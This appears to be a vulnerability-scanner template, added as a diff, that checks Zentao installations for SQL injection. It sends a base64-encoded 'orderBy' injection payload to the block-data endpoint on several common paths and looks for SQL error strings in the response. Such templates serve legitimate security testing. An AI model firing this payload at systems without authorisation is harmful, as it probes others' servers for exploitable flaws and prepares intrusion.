@@ -1,0 +1,35 @@
+id: zentao-sql-injection
+info:
+  name: Zentao Project Management System SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: Zentao
+
+variables:
+  r_payload: '{{base64("{\\"orderBy\\":\\"order limit 1,1\\",\\"num\\":\\"1,1\\",\\"type\\":\\"openedbyme\\"}")}}'
+  r_paths:
+    - /zentao/www
+    - /zentao
+    - /zentaopms
+    - /zentaopms/www
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{r_paths}}/index.php?m=block&f=main&mode=getblockdata&blockid=case&param={{r_payload}}"
+    headers:
+      Referer: "{{BaseURL}}{{r_paths}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQLSTATE"
+          - "Syntax error or access"
+          - "AND  deleted  = '0' oRdEr bY `order`"
+        part: body
+      - type: status
+        status:
+          - 200
+          - 500
